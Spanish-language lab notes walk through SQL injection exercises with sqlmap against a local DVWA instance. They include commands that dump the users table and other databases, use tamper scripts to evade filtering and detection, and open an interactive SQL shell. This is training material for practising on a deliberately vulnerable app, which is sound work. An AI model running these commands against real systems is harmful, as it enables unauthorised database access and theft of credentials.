++ URL: https://github.com/eystsen/pentestlab
--- cd <directorio>
--- apt install docker.io
--- bash pentestlab.sh 
--- bash pentestlab.sh list 
--- bash pentestlab.sh start dvwa
---- Para detener la aplicación web: bash pentestlab.sh stop dvwa
--- Acceder a la url con las credenciales por defecto (admin/password)
--- Clear / Reset All (en la interfaz web)

++ Uso general de SQLMAP
--- sqlmap --help

++ Ejercicio_1 (Encontrar vulnerabilidades)
--- Ir a la interfaz web de dvwa
--- Apartado sql injection
--- Ingresar un id
--- Copiar el url asociado al id
--- Volver a la terminal
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low'
--- Volver al sitio web ---> inspeccionar ---> storage ---> copiar el valor asociado a PHPSESSIONID
--- Pegarlo en la terminal
--- Enter
--- Se mostrarán las vulnerabilidades asociadas


++ Ejercicio_2 (Extraer información básica)
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs
--- Enter
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --tables -D dvwa ----> (Para extraer la tabla dvwa)
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --tables -D information_schema ----> (Para enumerar las tablas asociadas a la base de datos information_schema)


++ Ejercicio_3 (Extraer información en detalle)
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --tables -D dvwa -t users --dump-all ----> (Para ver la información de las tablas como tal)
--- y
--- y
--- Se nos mostrará en detalle la información asociada a las tablas (contenido)


++ Ejercicio_4 (Automatizar ataque SQL)
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --batch
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --batch
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' -D dvwa --tables --batch
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' -D dvwa -T users --dump-all --batch

++ Ejercicio_5 (Obtener información relacionada a la tecnología de la base de datos)
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner
--- Enter
--- Se mostrará la información relacionada a la base de datos
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner --current-db ---> (Nos muestra la base de datos actual: dvwa)
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner --current-db --dbs ---> (Nos muestra todas las bases de datos disponibles)

++ Ejercicio_6 (Usar el wizard)
--- sqlmap --wizard
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --wizard --batch
--- Enter
--- Enter
--- Enter
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --wizard --batch ---> (Si no se desean especificar las opciones personalizadas)


++ Ejercicio_7 (Tamper scripts: modifican los payloads para evitar sistemas de filtrado o detección)
--- sqlmap --list-tampers 
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --tamper=base64encode --batch --users
--- Abrir wireshark para ver la ejecución del payload
---- Seleccionar la interfaz loopback
--- Enter (terminal)
--- Verificar en wireshark la ejecución del payload
--- Volver a la terminal para ver el progreso


++ Ejercicio_8 (Mobile option)
--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --mobile
--- Seleccionar el dispositivo móvil que deseamos imitar, ejemplo: opción 3 (google nexus 7)
--- Abrir wireshark para comprobar 


++ Ejercicio_9 (SQL Shell)
--- sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --
cookie='PHPSESSID=qhj2pmck3k9gnmbn5ahvg80ok7; security=low' --sql-shell -
-batch
--- Comandos de ejemplo:
---- database() ---> Muestra la información referente a la base de datos
---- SELECT table_name FROM information_schema.tables WHERE
table_schema = 'dvwa';
---- SELECT * FROM dvwa.users;
---- SELECT * FROM dvwa.guestbook;
---- SELECT COUNT(*) FROM dvwa.users;
---- SELECT * FROM dvwa.users LIMIT 5;
---- SELECT COUNT(*), first_name FROM dvwa.users GROUP BY
first_name;
---- SELECT column_name, data_type FROM information_schema.columns
WHERE table_name = 'users';










